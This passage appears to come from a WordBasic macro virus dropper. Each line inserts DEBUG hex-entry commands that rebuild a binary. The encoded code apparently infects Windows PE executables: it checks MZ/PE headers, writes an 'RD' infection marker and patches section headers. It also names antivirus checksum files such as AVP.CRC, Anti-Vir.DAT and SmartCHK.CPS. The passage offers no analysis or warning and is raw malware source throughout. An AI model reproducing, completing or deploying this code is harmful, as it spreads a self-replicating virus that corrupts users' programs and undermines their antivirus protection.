"e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e40 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ea0 64 72 6f 6c 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ec0 41 56 50 2e 43 52 43 00 49 56 50 2e 4e 54 5a 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ed0 41 6e 74 69 2d 56 69 72 2e 44 41 54 00 43 48 4b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ee0 4c 69 73 74 2e 4d 53 00 43 48 4b 4c 69 73 74 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ef0 43 50 53 00 53 6d 61 72 74 43 48 4b 2e 4d 53 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f00 53 6d 61 72 74 43 48 4b 2e 43 50 53 00 ff c0 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f10 40 00 c8 17 40 00 d0 17 40 00 dd 17 40 00 e8 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f20 40 00 f4 17 40 00 00 18 40 00 0d 18 40 00 9c 60 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f30 e8 00 00 00 00 5d 81 ed 35 18 40 00 89 ad d6 19 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f40 40 00 e8 50 0c 00 00 8d 85 c6 19 40 00 50 64 67 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f50 ff 36 00 00 64 67 89 26 00 00 8b 44 24 2c 39 80 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f60 b4 00 00 00 74 1b 48 3d 00 00 00 40 76 02 eb ee " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f70 b8 00 00 f7 bf 66 81 38 4d 5a 74 05 b8 00 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f80 7f 89 85 8e 13 40 00 8b f8 66 81 3f 4d 5a 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f90 30 01 00 00 8b 7f 3c 03 bd 8e 13 40 00 66 81 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fa0 50 45 0f 85 1c 01 00 00 60 8b 77 78 03 b5 8e 13 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fb0 40 00 89 b5 a8 13 40 00 83 c6 10 ad 89 85 ac 13 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fc0 40 00 ad ad 89 85 b0 13 40 00 03 85 8e 13 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fd0 ad 03 85 8e 13 40 00 89 85 b4 13 40 00 ad 03 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fe0 8e 13 40 00 89 85 b8 13 40 00 ad 03 85 8e 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ff0 00 89 85 bc 13 40 00 8b b5 b4 13 40 00 ad 03 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1000 8e 13 40 00 8b b5 b8 13 40 00 89 b5 c0 13 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1010 8b 3e 03 bd 8e 13 40 00 b9 00 00 00 00 bb 0b 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1020 40 00 03 dd 8b f3 a6 75 07 80 3f 00 74 28 eb f6 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1030 66 41 66 3b 8d b0 13 40 00 0f 8d 85 00 00 00 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1040 85 c0 13 40 00 04 8b b5 c0 13 40 00 8b 3e 03 bd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1050 8e 13 40 00 eb ce 8b de 43 d1 e1 8b b5 bc 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1060 00 03 f1 33 c0 66 8b 06 c1 e0 02 8b b5 b4 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1070 00 03 f0 8b 3e 03 bd 8e 13 40 00 89 bd 95 11 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1080 00 61 be 1a 10 40 00 bf 99 11 40 00 03 f5 03 fd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1090 56 8b 85 8e 13 40 00 50 ff 95 95 11 40 00 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10a0 00 74 21 ab 46 80 3e 00 75 fa 46 80 3e ff 75 e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10b0 83 fd 00 74 05 e8 c0 05 00 00 e8 53 00 00 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10c0 6c 00 00 00 eb 04 8b 64 24 08 64 67 8f 06 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10d0 83 c4 04 61 57 bf 00 00 00 00 83 ff 00 74 28 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10e0 87 c4 13 40 00 03 87 a0 13 40 00 50 53 8d 9f 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10f0 1a 40 00 2b c3 83 e8 04 89 87 03 1a 40 00 5b 58 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1100 5f 9d e9 00 00 00 00 83 c4 04 6a 00 ff 97 99 11 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1110 40 00 6a 00 ff 95 bd 11 40 00 83 f8 03 75 09 c6 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1120 85 44 17 40 00 01 eb 07 c6 85 44 17 40 00 00 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1130 68 80 00 00 00 8d 85 f0 14 40 00 50 ff 95 e5 11 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1140 40 00 68 80 00 00 00 8d 85 18 16 40 00 50 ff 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1150 e9 11 40 00 8d 85 c8 13 40 00 50 68 80 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1160 ff 95 a5 11 40 00 80 bd 44 17 40 00 00 74 0f c7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1170 85 40 17 40 00 03 00 00 00 e8 4b 00 00 00 83 fd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1180 00 74 38 8d 85 f0 14 40 00 50 ff 95 ed 11 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1190 c7 85 40 17 40 00 03 00 00 00 e8 2a 00 00 00 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11a0 85 18 16 40 00 50 ff 95 ed 11 40 00 c7 85 40 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11b0 40 00 03 00 00 00 e8 0e 00 00 00 8d 85 c8 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11c0 00 50 ff 95 ed 11 40 00 c3 8d bd 3d 12 40 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11d0 c7 50 8d 85 05 10 40 00 50 ff 95 9d 11 40 00 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11e0 f8 ff 74 50 50 8d 77 2c 8b 4f 20 e8 4a 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11f0 72 10 ff 8d 40 17 40 00 66 83 bd 40 17 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1200 74 2a 58 50 57 50 ff 95 a1 11 40 00 85 c0 74 1c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1210 8d 77 2c 8b 4f 20 e8 1f 00 00 00 72 06 ff 8d 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1220 17 40 00 83 bd 40 17 40 00 00 75 d6 58 50 ff 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1230 c5 11 40 00 e8 e4 08 00 00 c3 60 89 8d 71 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1240 00 66 c7 85 79 17 40 00 00 00 81 c1 d9 14 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1250 81 c1 00 10 00 00 89 8d 4d 17 40 00 89 b5 55 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1260 40 00 56 ff 95 b5 11 40 00 83 f8 00 74 06 89 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1270 51 17 40 00 68 80 00 00 00 56 ff 95 b9 11 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1280 6a 00 6a 00 6a 03 6a 00 6a 01 68 00 00 00 c0 56 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1290 ff 95 c1 11 40 00 89 85 49 17 40 00 83 f8 ff 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12a0 84 c4 03 00 00 bb 59 17 40 00 03 dd 53 83 c3 08 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12b0 53 83 c3 08 53 50 ff 95 c9 11 40 00 6a 00 ff b5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12c0 49 17 40 00 ff 95 d5 11 40 00 89 85 71 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12d0 6a 00 ff b5 4d 17 40 00 6a 00 6a 04 6a 00 ff b5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12e0 49 17 40 00 ff 95 a9 11 40 00 89 85 45 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12f0 83 f8 00 0f 84 12 03 00 00 ff b5 4d 17 40 00 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1300 00 6a 00 6a 02 50 ff 95 ad 11 40 00 83 f8 00 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1310 84 ea 02 00 00 8b f0 89 b5 75 17 40 00 66 81 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1320 4d 5a 0f 85 c2 02 00 00 66 81 7e 12 52 44 0f 84 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1330 b6 02 00 00 8b 7e 3c 81 ff 00 10 00 00 0f 87 a7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1340 02 00 00 03 fe 66 81 3f 50 45 0f 85 9a 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1350 89 bd 7b 17 40 00 66 8b 47 16 66 a9 00 20 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1360 86 02 00 00 83 c7 18 8b 47 24 89 85 83 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1370 8b 47 20 89 85 87 17 40 00 8b 47 10 89 85 c4 13 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1380 40 00 8b 47 1c 89 85 a0 13 40 00 8b 87 88 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1390 00 89 85 b4 17 40 00 8b 47 70 89 85 b8 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13a0 8b 5f 5c c1 e3 03 33 c0 66 8b 47 ee 48 b9 28 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13b0 00 00 f7 e1 8b b5 7b 17 40 00 83 c6 18 83 c6 60 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13c0 03 f3 03 f0 8b 46 0c 89 85 a8 17 40 00 8b 8d b4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13d0 17 40 00 83 f9 00 74 10 3b c8 75 0c c7 85 b0 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13e0 40 00 01 00 00 00 eb 21 8b 8d b8 17 40 00 83 f9 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13f0 00 0f 84 f3 01 00 00 3b c8 0f 85 eb 01 00 00 c7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1400 85 b0 17 40 00 03 00 00 00 89 b5 7f 17 40 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1410 fe 83 c7 28 b9 28 00 00 00 f3 a4 ff 76 08 6a 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1420 ff 95 f5 11 40 00 0b c0 0f 84 bc 01 00 00 8b f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1430 8b 4e 08 51 8b 76 14 03 b5 75 17 40 00 56 f3 a4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1440 5f 8d b5 00 10 40 00 b9 d9 14 00 00 f3 a4 50 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1450 d9 14 00 00 8b 8d 83 17 40 00 50 51 33 d2 f7 f1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1460 59 81 c1 d9 14 00 00 2b ca 78 0b 89 8d 8b 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1470 00 58 b0 00 f3 aa 58 59 8b f0 81 ef d9 14 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1480 f3 a4 0f 23 c7 e8 cf 06 00 00 8b b5 7f 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1490 56 87 f7 8d b5 9f 17 40 00 b9 08 00 00 00 f3 a4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14a0 5e c7 46 24 40 00 00 c0 c7 46 08 d9 14 00 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14b0 85 8b 17 40 00 89 46 10 8b 5e 0c 53 03 d8 93 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14c0 8d 87 17 40 00 33 d2 f7 f1 40 f7 e1 93 83 c6 28 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14d0 01 46 14 53 8b 4e 0c 2b d9 89 9d bc 17 40 00 5b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14e0 89 5e 0c 89 9d ac 17 40 00 83 bd b0 17 40 00 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14f0 74 5b 8b 76 14 03 b5 75 17 40 00 8b fe 83 c7 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1500 e8 02 00 00 00 eb 46 33 c9 66 8b 4e 0c 66 03 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1510 0e 83 c6 10 51 56 e8 08 00 00 00 5e 59 83 c6 08 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1520 e2 f2 c3 8b 46 04 8b f7 a9 00 00 00 80 74 10 35 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1530 00 00 00 80 03 f0 83 ee 10 e8 c9 ff ff ff c3 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1540 f0 83 ee 10 8b 85 bc 17 40 00 01 06 c3 8b 85 71 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1550 17 40 00 05 d9 14 00 00 8b 8d 83 17 40 00 50 51 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1560 33 d2 f7 f1 59 2b ca 58 03 c1 89 85 71 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1570 0f 21 c1 2b 0d 75 17 40 00 2b c1 78 08 91 0f 21 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1580 c7 b0 00 f3 aa 8b b5 7b 17 40 00 ff 46 06 83 c6 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1590 18 5b 89 5e 10 8b 46 38 05 d9 14 00 00 8b 8d 87 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15a0 17 40 00 50 51 33 d2 f7 f1 59 2b ca 58 03 c1 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15b0 46 38 8b 9d a8 17 40 00 8d 76 60 b9 10 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15c0 ad 3b d8 75 0b 8b 85 ac 17 40 00 89 46 fc eb 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15d0 ad e2 ed 8b b5 75 17 40 00 66 c7 46 12 52 44 66 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15e0 c7 85 79 17 40 00 00 00 eb 09 66 c7 85 79 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15f0 00 ff 00 ff b5 75 17 40 00 ff 95 b1 11 40 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1600 b5 45 17 40 00 ff 95 c5 11 40 00 6a 00 6a 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1610 b5 71 17 40 00 ff b5 49 17 40 00 ff 95 d1 11 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1620 00 ff b5 49 17 40 00 ff 95 d9 11 40 00 bb 59 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1630 40 00 03 dd 53 83 c3 08 53 83 c3 08 53 ff b5 49 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1640 17 40 00 ff 95 cd 11 40 00 ff b5 49 17 40 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1650 95 c5 11 40 00 ff b5 51 17 40 00 ff b5 55 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1660 00 ff 95 b9 11 40 00 eb 03 f9 eb 0c 66 81 bd 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1670 17 40 00 ff 00 74 f2 f8 61 c3 60 8d 85 92 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1680 00 50 ff 95 e1 11 40 00 83 f8 00 0f 84 85 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1690 00 89 85 9c 13 40 00 8d 85 31 12 40 00 50 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16a0 9c 13 40 00 50 ff 95 95 11 40 00 83 f8 00 0f 84 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16b0 62 01 00 00 8b d8 8d 85 8f 17 40 00 8b f8 50 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16c0 95 dd 11 40 00 8b 47 04 25 00 00 ff ff c1 e8 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16d0 83 f8 07 0f 85 3d 01 00 00 68 30 10 00 00 8d 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16e0 18 21 40 00 50 8d 85 44 21 40 00 50 6a 00 ff d3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16f0 8d 85 fd 11 40 00 50 ff 95 e1 11 40 00 83 f8 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1700 0f 84 10 01 00 00 8b d8 8d 85 0a 12 40 00 50 53 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1710 ff 95 95 11 40 00 83 f8 00 0f 84 f7 00 00 00 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1720 85 29 12 40 00 8d 85 1a 12 40 00 50 53 ff 95 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1730 11 40 00 83 f8 00 0f 84 da 00 00 00 89 85 2d 12 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1740 40 00 68 80 00 00 00 8d 85 a2 21 40 00 50 ff 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1750 e9 11 40 00 8d bd a2 21 40 00 b0 00 b9 80 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1760 00 f2 ae c6 47 ff 5c 8d b5 a6 22 40 00 b9 09 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1770 00 00 f3 a4 8d b5 a2 21 40 00 6a 00 6a 00 6a 02 " + _
Chr(34) + "" + T$
